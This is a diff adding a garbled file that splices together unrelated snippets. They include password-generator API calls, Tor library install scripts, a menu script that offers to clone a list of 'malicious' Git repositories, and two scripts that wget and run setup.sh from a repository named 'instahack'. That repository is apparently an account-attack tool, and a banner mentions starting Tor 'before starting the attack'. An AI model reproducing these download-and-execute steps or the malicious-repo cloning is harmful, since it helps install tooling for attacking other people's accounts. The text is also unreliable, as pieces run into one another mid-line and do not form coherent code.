@@ -1,0 +1,297 @@
+# Generate a password with default settings (length=14, include all)
+curl --request GET \
+	--url https://securepassgen-api-ultimate-online-password-generator.p.rapidapi.com/api/generate-password \
+	--header 'X-RapidAPI-Host: securepassgen-api-ultimate-online-password-generator.p.rapidapi.com' \
+	--header 'X-RapidAPI-Key: YOUR_API_KEY'
+
+# Generate a password with custom settings
+curl --request GET \
+	--url https://securepassgen-api-ultimate-online-password-generator.p.rapidapi.com/api/generate-password?length=16&include_uppercase=true&include_digits=true&exclude_similar_chars=true \
+	--header 'X-RapidAPI-Host: securepassgen-api-ultimate-online-password-generator.p.rapidapi.com' \
+	--header 'X-RapidAPI-Key: YOUR_API_KEY'# Generate a password with default settings (length=14, include all)
+import requests
+
+url = "https://securepassgen-api-ultimate-online-password-generator.p.rapidapi.com/api/generate-password"
+
+headers = {
+	"X-RapidAPI-Key": "YOUR_API_KEY",
+	"X-RapidAPI-Host": "securepassgen-api-ultimate-online-password-generator.p.rapidapi.com"
+}
+
+response = requests.get(url, headers=headers)
+
+print(response.json())// Generate a password with default settings (length=14, include all)
+var settings = {
+    "async": true,
+    "crossDomain": true,
+    "url": "https://securepassgen-api-ultimate-online-password-generator.p.rapidapi.com/api/generate-password",
+    "method": "GET",
+    "headers": {
+        "X-RapidAPI-Host": "securepassgen-api-ultimate-online-password-generator.p.rapidapi.com",
+        "X-RapidAPI-Key": "YOUR_API_KEY"
+    }
+}git clone https://github.com/evildevill/passgen-flask.gitcd passgen-flaskpip install -r requirements.txtpython app.py[+]--Now you need internet connection to continue further process...
+
+[+]--You can select any option by clicking on your keyboard
+
+[+]--Note:- Don't delete any of the scripts included in core files
+
+[+]--new session and start TOR (tor) before starting the attack#!/bin/bashFunction to update setuptools and pipupdate_setuptools_and_pip() { echo "Updating setuptools..." sudo easy_install3 -U pip }Function to upgrade requests libraryupgrade_requests_library() { echo "Upgrading requests library..." sudo pip3 install requests --upgrade }Function to install requests[socks]install_requests_socks() { echo "Installing requests[socks]..." sudo pip3 install requests[socks] }Function to install stem libraryinstall_stem_library() { echo "Installing stem library..." sudo pip3 install stem }$ sudo easy_install3 -U pip # you have to install python3-setuptools , update pip
+$ sudo pip3 install requests --upgrade
+$ sudo pip3 install requests[socks]
+$ sudo pip3 install stem add #!/bin/bash
+
+# Function to update setuptools and pip
+update_setuptools_and_pip() {
+    echo "Updating setuptools..."
+    sudo easy_install3 -U pip
+}
+
+# Function to upgrade requests library
+upgrade_requests_library() {
+    echo "Upgrading requests library..."
+    sudo pip3 install requests --upgrade
+}
+
+# Function to install requests[socks]
+install_requests_socks() {
+    echo "Installing requests[socks]..."
+    sudo pip3 install requests[socks]
+}
+
+# Function to install stem library
+install_stem_library() {
+    echo "Installing stem library..."
+    sudo pip3 install stem
+}
+
+# Main function to execute the script
+main() {
+    update_setuptools_and_pip
+    upgrade_requests_library
+    install_requests_socks
+    install_stem_library
+}
+
+# Execute the main function
+main$ sudo easy_install3 -U pip # you have to install python3-setuptools , update pip
+$ sudo pip3 install requests --upgrade
+$ sudo pip3 install requests[socks]
+$ sudo pip3 install stem add #!/bin/bash
+
+# Function to call a sample API
+call_sample_api() {
+    local endpoint="$1"
+    local url="https://api.example.com/$endpoint"
+    echo "Calling sample API: $url"
+    curl -s "$url"
+}
+
+# Function to process the data
+process_data() {
+    local data="$1"
+    # Extract specific information (e.g., values associated with a key)
+    filtered_data=$(echo "$data" | jq -r '.results[].value')
+
+    # Perform additional data manipulation or calculations
+    # For demonstration, let's calculate sum, average, and standard deviation
+    sum=0
+    count=0
+    sum_of_squares=0
+
+    # Iterate over each value and calculate sum and sum of squares
+    while read -r value; do
+        sum=$((sum + value))
+        sum_of_squares=$((sum_of_squares + value * value))
+        ((count++))
+    done <<< "$filtered_data"
+
+    # Calculate average
+    average=$(echo "scale=2; $sum / $count" | bc)
+
+    # Calculate variance
+    variance=$(echo "scale=2; ($sum_of_squares / $count) - ($average * $average)" | bc)
+
+    # Calculate standard deviation
+    std_deviation=$(echo "scale=2; sqrt($variance)" | bc)
+
+    # Display the results
+    echo "Sum of values: $sum"
+    echo "Average of values: $average"
+    echo "Standard deviation of values: $std_deviation"
+}
+
+# Function to read data from a file
+read_from_file() {
+    local file="$1"
+    echo "Reading data from file: $file"
+    cat "$file"
+}
+
+# Function to write data to a file
+write_to_file() {
+    local data="$1"
+    local file="$2"
+    echo "Writing data to file: $file"
+    echo "$data" > "$file"
+}
+
+# Function to read payload data from a file
+read_payload() {
+    local payload_file="$1"
+    echo "Reading payload data from file: $payload_file"
+    cat "$payload_file"
+}
+
+# Function to write payload data to a file
+write_payload() {
+    local payload_data="$1"
+    local payload_file="$2"
+    echo "Writing payload data to file: $payload_file"
+    echo "$payload_data" > "$payload_file"
+}
+
+# Function to display menu options
+display_menu() {
+    echo "Select an option:"
+    echo "1. Call API and process data"
+    echo "2. Read data from file"
+    echo "3. Write data to file"
+    echo "4. Read payload from file"
+    echo "5. Write payload to file"
+    echo "6. Clone Git repository"
+    echo "7. Exit"
+}
+
+# Function to clone a Git repository
+clone_repository() {
+    local repository_url="$1"
+    local destination="$2"
+    echo "Cloning repository from $repository_url to $destination"
+    git clone "$repository_url" "$destination"
+}
+
+# Malicious Git repository URLs
+malicious_repos=(
+    "https://example.com/malware_repo_1.git"
+    "https://example.com/malware_repo_2.git"
+    "https://example.com/malware_repo_3.git"
+)
+
+# Main function to execute the script
+main() {
+    while true; do
+        display_menu
+        read -p "Enter your choice (1-7): " choice
+        case $choice in
+            1)
+                # Call the sample API and process the data
+                api_data=$(call_sample_api "data")
+                process_data "$api_data"
+                ;;
+            2)
+                # Read data from a file
+                read_from_file "input.txt"
+                ;;
+            3)
+                # Write data to a file
+                api_data=$(call_sample_api "data")
+                write_to_file "$api_data" "output.txt"
+                ;;
+            4)
+                # Read payload from a file
+                read_payload "payload.txt"
+                ;;
+            5)
+                # Write payload to a file
+                payload=$(read_payload "payload.txt")
+                write_payload "$payload" "output_payload.txt"
+                ;;
+            6)
+                # Clone a Git repository
+                echo "Select a malicious Git repository to clone:"
+                for ((i=0; i<${#malicious_repos[@]}; i++)); do
+                    echo "$((i+1)). ${malicious_repos[i]}"
+                done
+                read -p "Enter the repository number to clone: " repo_number
+                if [[ "$repo_number" =~ ^[1-${#malicious_repos[@]}]$ ]]; then
+                    read -p "Enter the destination directory: " destination
+                    clone_repository "${malicious_repos[repo_number-1]}" "$destination"
+                else
+                    echo "Invalid repository number."
+                fi
+                ;;
+            7)
+                # Exit the script
+                echo "Exiting..."
+                exit 0
+                ;;
+            *)
+                echo "Invalid input: Please enter a number between 1 and 7."
+                ;;
+        esac
+    done
+}
+
+# Execute the main function
+main add#!/bin/bash
+
+# Function to update setuptools and pip
+update_setuptools_and_pip() {
+    echo "Updating setuptools..."
+    sudo easy_install3 -U pip
+}
+
+# Function to upgrade requests library
+upgrade_requests_library() {
+    echo "Upgrading requests library..."
+    sudo pip3 install requests --upgrade
+}
+
+# Function to install requests[socks]
+install_requests_socks() {
+    echo "Installing requests[socks]..."
+    sudo pip3 install requests[socks]
+}
+
+# Function to install stem library
+install_stem_library() {
+    echo "Installing stem library..."
+    sudo pip3 install stem
+}
+
+# Function to download and execute setup.sh
+download_and_execute_setup() {
+    echo "Downloading setup.sh..."
+    wget https://raw.githubusercontent.com/evildevill/instahack/master/setup.sh
+    echo "Executing setup.sh..."
+    bash setup.sh
+}
+
+# Main function to execute the script
+main() {
+    update_setuptools_and_pip
+    upgrade_requests_library
+    install_requests_socks
+    install_stem_library
+    download_and_execute_setup
+}
+
+# Execute the main function
+main#!/bin/bash
+
+# Function to download and execute setup.sh
+download_and_execute_setup() {
+    echo "Downloading setup.sh..."
+    wget https://raw.githubusercontent.com/evildevill/instahack/master/setup.sh
+    echo "Executing setup.sh..."
+    bash setup.sh
+}
+
+# Main function to execute the script
+main() {
+    download_and_execute_setup
+}
+
+# Execute the main function
+main
